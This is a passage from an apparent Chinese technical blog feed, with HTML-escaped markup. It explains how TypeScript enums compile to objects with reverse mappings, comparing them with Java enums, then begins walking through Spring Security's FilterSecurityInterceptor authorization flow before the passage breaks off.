&lt;/code>&lt;/pre>&lt;/div>&lt;p>你可能会说用常量也可以表示这个概念。但是，常量无法体现「今天只能是一周中的某一天」—— &lt;code>Today ∈ Week={monday,Tuesday,...., Sunday} &lt;/code> 这个概念。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#66d9ef">enum&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span> {
&lt;span style="color:#a6e22e">Monday&lt;/span>,
&lt;span style="color:#a6e22e">Tuesday&lt;/span>,
&lt;span style="color:#a6e22e">Sunday&lt;/span>,
}
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">f&lt;/span>(&lt;span style="color:#a6e22e">today&lt;/span>: &lt;span style="color:#66d9ef">Week&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">today&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>) {
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;today is Monday!&amp;#34;&lt;/span>);
}
}
&lt;span style="color:#75715e">// f(&amp;#34;happyDay&amp;#34;); ==&amp;gt; type error! string is not Enum
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">f&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="typescript-中枚举的行为">typescript 中枚举的行为&lt;/h2>
&lt;p>到目前为止，上述示例代码中的枚举行为都是符合预期的。但是「一切正常」向来不是 javascript 的风格。&lt;/p>
&lt;p>在 ts 中，下面这样的代码也可以编译成功。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#66d9ef">enum&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span> {
&lt;span style="color:#a6e22e">Monday&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Monday&amp;#34;&lt;/span>,
&lt;span style="color:#a6e22e">Tuesday&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Tuesday&amp;#34;&lt;/span>,
&lt;span style="color:#a6e22e">Sunday&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>,
}
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>);
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;Monday&amp;#34;&lt;/span>]); &lt;span style="color:#75715e">// ===&amp;gt; Monday
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">// f(&amp;#34;day&amp;#34;); ==&amp;gt; type error! string is not Enum
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">soo&lt;/span>(&lt;span style="color:#a6e22e">option&lt;/span>: &lt;span style="color:#66d9ef">string&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">option&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>) {
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;today is Monday!&amp;#34;&lt;/span>);
}
}
&lt;span style="color:#a6e22e">soo&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>);
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">doo&lt;/span>(&lt;span style="color:#a6e22e">option&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {}) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">option&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>) {
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;today is Monday!&amp;#34;&lt;/span>);
}
}
&lt;span style="color:#a6e22e">doo&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>);
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#a6e22e">option&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { &lt;span style="color:#a6e22e">Monday&lt;/span>: &lt;span style="color:#66d9ef">Week.Monday&lt;/span> }) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">option&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>) {
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;today is Monday!&amp;#34;&lt;/span>);
}
}
&lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>只要和真正的面向对象语言中枚举的行为相比较，就能发觉 ts 中枚举的类型检查非常的不严谨。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Scratch&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
test&lt;span style="color:#f92672">(&lt;/span>Week&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Monday&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">test&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Week w&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>w&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>w&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">code&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>w&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Week&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Monday&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Week&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Monday&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>w&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Week&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Tuesday&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Week&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Tuesday&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">enum&lt;/span> Week &lt;span style="color:#f92672">{&lt;/span>
Monday&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Monday&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> 001&lt;span style="color:#f92672">),&lt;/span>
Tuesday&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Tuesday&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> 002&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> String name&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> Integer code&lt;span style="color:#f92672">;&lt;/span>
Week&lt;span style="color:#f92672">(&lt;/span>String name&lt;span style="color:#f92672">,&lt;/span> Integer code&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> code&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> String &lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Week{&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;name=&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;, code=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> code &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;}&amp;#39;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不严谨就算了，ts 中的数字枚举成员还有「反向映射」这样放飞自我的行为。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#66d9ef">enum&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span> {
&lt;span style="color:#a6e22e">Monday&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Monday&amp;#34;&lt;/span>,
&lt;span style="color:#a6e22e">Tuesday&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Tuesday&amp;#34;&lt;/span>,
&lt;span style="color:#a6e22e">Sunday&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>,
}
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>[&lt;span style="color:#ae81ff">7&lt;/span>]); &lt;span style="color:#75715e">// ===&amp;gt; Sunday
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="typescript-中的枚举是什么">typescript 中的枚举是什么&lt;/h2>
&lt;p>打印 ts 中的枚举会输出一个对象。这个对象的属性由枚举成员的 key 与枚举成员的 value 构成。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#66d9ef">enum&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span> {
&lt;span style="color:#a6e22e">Monday&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Monday&amp;#34;&lt;/span>,
&lt;span style="color:#a6e22e">Tuesday&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Tuesday&amp;#34;&lt;/span>,
&lt;span style="color:#a6e22e">Sunday&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>,
}
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>);
&lt;span style="color:#f92672">-----------&lt;/span>
{ &lt;span style="color:#e6db74">&amp;#39;7&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Sunday&amp;#39;&lt;/span>, &lt;span style="color:#a6e22e">Monday&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Monday&amp;#39;&lt;/span>, &lt;span style="color:#a6e22e">Tuesday&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Tuesday&amp;#39;&lt;/span>, &lt;span style="color:#a6e22e">Sunday&lt;/span>: &lt;span style="color:#66d9ef">7&lt;/span> }
&lt;/code>&lt;/pre>&lt;/div>&lt;p>要注意的是，数字枚举成员除了生成 key/value 形式的正向映射属性以外，还生成 value/key 的反向映射属性 &lt;code>{'7': 'Sunday'}&lt;/code>；而字符串枚举成员只会生成正向映射的属性。&lt;/p>
&lt;p>这些行为，都来源于 ts 将枚举设计为一个 js 对象，再通过立即执行函数和赋值操作符返回等式右边值的特性，创建这个对象的正反映射属性造成的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span>;
(&lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">Week&lt;/span>) {
&lt;span style="color:#a6e22e">Week&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;Monday&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Monday&amp;#34;&lt;/span>;
&lt;span style="color:#a6e22e">Week&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;Tuesday&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Tuesday&amp;#34;&lt;/span>;
&lt;span style="color:#a6e22e">Week&lt;/span>[&lt;span style="color:#a6e22e">Week&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;Sunday&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Sunday&amp;#34;&lt;/span>;
})(&lt;span style="color:#a6e22e">Week&lt;/span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#a6e22e">Week&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {}));
&lt;/code>&lt;/pre>&lt;/div>&lt;p>既然枚举就是对象，那通过「句点操作符」访问属性就能够获取到枚举成员的 value，于是可以通过 soo 函数的参数类型验证。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">soo&lt;/span>(&lt;span style="color:#a6e22e">option&lt;/span>: &lt;span style="color:#66d9ef">string&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">option&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>) {
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;today is Monday!&amp;#34;&lt;/span>);
}
}
&lt;span style="color:#a6e22e">soo&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>);
&lt;span style="color:#a6e22e">soo&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;Tuesday&amp;#34;&lt;/span>]);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>同时枚举对象还拥有数字枚举成员的反向映射属性，那么实现「反向映射」功能显然是轻而易举。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>[&lt;span style="color:#ae81ff">7&lt;/span>]); &lt;span style="color:#75715e">// ===&amp;gt; &amp;#34;Sunday&amp;#34;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而那些使用对象作为参数类型的函数，理所应当的可以编译成功。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">doo&lt;/span>(&lt;span style="color:#a6e22e">option&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {}) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">option&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>) {
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;today is Monday!&amp;#34;&lt;/span>);
}
}
&lt;span style="color:#a6e22e">doo&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>);
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#a6e22e">option&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { &lt;span style="color:#a6e22e">Monday&lt;/span>: &lt;span style="color:#66d9ef">Week.Monday&lt;/span>; &lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span> }) {
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">option&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">Week&lt;/span>.&lt;span style="color:#a6e22e">Monday&lt;/span>) {
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;today is Monday!&amp;#34;&lt;/span>);
}
}
&lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#a6e22e">Week&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后因为枚举就是对象，对象就是函数，函数就是类；所以在 ts 中枚举也是类，是对客观事物的归纳与自然语言的抽象。&lt;/p></description></item><item><title>Spring Security 如何进行权限验证</title><link>https://www.chucklin.net/post/springsecurity_authority/</link><pubDate>Mon, 05 Apr 2021 10:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/springsecurity_authority/</guid><description>&lt;h2 id="filtersecurityinterceptordofilter">FilterSecurityInterceptor.doFilter&lt;/h2>
&lt;p>FilterSecurityIntercptor 是负责权限验证的过滤器。一般来说，权限验证是一系列业务逻辑处理完成以后，最后需要解决的问题。所以默认情况下 security 会把和权限有关的过滤器，放在 VirtualFilter chains 的最后一位。&lt;/p>
&lt;p>FilterSecurityIntercptor.doFilter 方法定义了两个权限验证逻辑。分别是 super.beforeInvocation 方法代表的权限前置验证与 super.afterInvocation 代表的后置权限验证。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/filter.png" alt="">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>FilterInvocation fi&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ServletException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRequest&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRequest&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>FILTER_APPLIED&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> observeOncePerRequest&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// filter already applied to this request and user wants us to observe
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// once-per-request handling, so don&amp;#39;t re-do security checking
&lt;/span>&lt;span style="color:#75715e">&lt;/span> fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getChain&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRequest&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getResponse&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// first time this request being called, so perform security checking
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRequest&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> observeOncePerRequest&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRequest&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">setAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>FILTER_APPLIED&lt;span style="color:#f92672">,&lt;/span> Boolean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">TRUE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
InterceptorStatusToken token &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">beforeInvocation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>fi&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getChain&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRequest&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> fi&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getResponse&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">finallyInvocation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>token&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">afterInvocation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>token&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="abstractsecurityinterceptorbeforeinvocation">AbstractSecurityInterceptor.beforeInvocation&lt;/h2>
&lt;p>和身份验证的设计类似，前置权限验证的业务处理也是参考模板方法设计模式的理念，将核心处理流程定义在父类 AbstractSecurityInterceptor 中的。再通过关联 AccessDecisionManager 的方式，把身份验证通过的认证对象委托给 AccessDecisionManager 执行。&lt;/p>
&lt;p>在前置权限校验执行完毕后，会使用 this.runAsManager.buildRunAs 与 SecurityContextHolder.getContext().setAuthentication(runAs) 方法将当前上下文中的身份认证成功的对象备份，然后重新拷贝一个新的鉴权成功的对象到上下文的中。这个处理初看会有点难以理解，但是仔细思考一下，这其实是一个友好且细腻的操作。&lt;/p>
&lt;p>原因是 FilterSecurityIntercptor 在大部分情况下是最后一个默认过滤器，如果说还有后续过滤操作的话，那这些肯定是你的自定义的过滤器对象行为产生的。安全起见，security 将权限认证过后的 authenticated 对象拷贝了一份副本，方便用户在后续的自定义过滤器中使用。&lt;/p>
&lt;p>即使自定义过滤器中不小心修改了全局上下文中的 authenticate 对象也无妨，因为 super.finallyInvocation 方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
